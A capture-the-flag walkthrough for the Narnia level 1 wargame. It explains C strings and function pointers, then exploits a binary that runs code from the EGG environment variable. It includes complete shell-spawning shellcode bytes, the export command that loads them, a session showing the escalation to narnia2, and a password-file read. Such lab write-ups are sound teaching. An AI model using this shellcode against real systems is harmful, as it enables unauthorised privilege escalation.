# Introduction
Just after our last level exploit, we can run: `$> cat /etc/narnia_pass/narnia1` to get *narnia1*'s password for easy SSH access.

# The Challenge
## Overview
The binary for this level is `/narnia/narnia1`, and its source code (in the same path) is the following:
```C
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```
Let's analyze it.

## Code Analysis
In the first line
```C 
int (*ret)();
```
we have an integer-returning function pointer named "*ret*". Function pointers are usually used to store the exact memory address of the start of a function.

Right after that
```C
if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
}
```
we have an *if* statement using the *getenv("EGG")* function call. With some research, you'll discover that this function has the `char *getenv( const char *name )` signature, and it's used to return the contents of an environment variable as a string.

If the "EGG" environment variable is empty or doesn't exist, the function returns 0, so our if statement will be true (since 0 is equal to NULL in C) and will print out a message requiring a value for EGG, and then exit.

The last part is the most interesting:
```C
printf("Trying to execute EGG!\n");
ret = getenv("EGG");
ret();
```
It gets the *EGG* value into *ret* and then tries to execute it with `ret()`. So it seems that the only way to pass this challenge is to put some executable code inside *EGG* to be run by `ret()`. 

But here are a few questions:
* How can we turn a string (returned by getenv) into executable code?
* And why would it be executed by *ret*, since it is a pointer and should contain a function address instead of code itself?

To pass this challenge, we need to answer these questions properly.

## Strings
### How Does C Work with Strings?
Strings in C are a sequence of bytes where each one contains the binary code for an ASCII character, and these bytes are called *char*s. A string in C is not directly handled in code by variables or literal string arguments, but instead, only its first character's (byte) memory address is used. 

So any string in code is actually a pointer to the first character of the entire char sequence in memory. We can clearly see this in the following example code:
```C
#include <stdio.h>

int main(){
  char * mystr = "Hello World\0";
  printf("String start address: %p\n", mystr);
  printf("Content of the address: %c\n", *mystr);
  printf("Whole string: \"%s\"\n", mystr);
  return 0;
}
```
In my execution, this was the output:
```
String start address: 0x562f678b5004
Content of the address: H
Whole string: "Hello World"
```
Here we can see the real difference between:
* the address stored in `mystr`;
* the actual value inside this address;
* and the whole string as printed by printf.
  
### Turning a String into Executable Code
At this point we know that a string in C code is the address of the first string's char (byte) in memory. We also know that if we put some text (ASCII characters) in a string, memory will actually store the binary representation of these characters. 

But what if instead of ASCII characters, we put executable code instructions (already assembled) in *EGG*? This is the real goal of the challenge.

In the command line, we can use the Linux printf function with the same name command `printf`. With printf we can transform each byte of a binary executable set of instructions into its ASCII character representation; this technique is called `shellcoding`.

If we use printf to write these ASCII chars into an environment variable, it will actually store the binary code of each ASCII character in memory, meaning that the string will be transformed back to its original form: pure binary executable instructions.

So our next step will be getting a shellcode (I picked one that just starts bash, but you can choose or build your own), and loading it inside the *EGG* memory space. We can do it with:
```bash
export EGG="$(printf '\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81')"
```

Don't worry about all these `\x` sequences; they are just hexadecimal representations of the binary code to make it visually smaller. At runtime, these hex codes are translated into ASCII, in the same way we discussed earlier.

Now, we can check to confirm that our bytes are loaded into *EGG*:
```bash
$> echo $EGG
�^1ɱ!l��u�������k           YSgi.q�Skii0cbti0cjo�SRT�΁
```

## Functions
### What are Function Pointers?
Function pointers in C are variables used to store the address of the very first assembly instruction of a function. In general, every function name inside the code is a macro for the function's address. A very common example follows:
```C
#include <stdio.h>

int test_func(){
	return 0;
}

int main(){
  int (*fpointer)() = test_func;
  printf("test_func address: %p\n", fpointer);
  return 0;
}
```
The output will be something like this: `test_func address: 0x555c514e6139`.

### The Exploitation
Now that we know how function pointers work, we can properly understand how to pass the challenge.

According to the source code and our shellcode loaded into *EGG*, the following steps will occur:
* Our shellcode will be loaded as binary executable code into the *EGG* variable's memory space;
* The *getenv("EGG")* function call will return the first byte address of our shellcode string into the *ret* function pointer;
* The *ret* function pointer now points to executable code in memory, since memory does not differentiate between data types;
* The *ret()* function call will then execute our code starting at the address stored inside *ret*;
* If we have put the right shellcode inside *EGG*, we will have a bash session.

So let's see it in action:
```bash
narnia1@narnia:~$ export EGG="$(printf '\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81')"
narnia1@narnia:~$ /narnia/narnia1
Trying to execute EGG!
bash-5.2$ whoami
narnia2
```
Since the binary owner is *narnia2*, the shell spawns as this user.

# Conclusion
You should now understand all the topics this challenge wanted to teach about strings, functions, environment variables, and so on. See you in the next level!
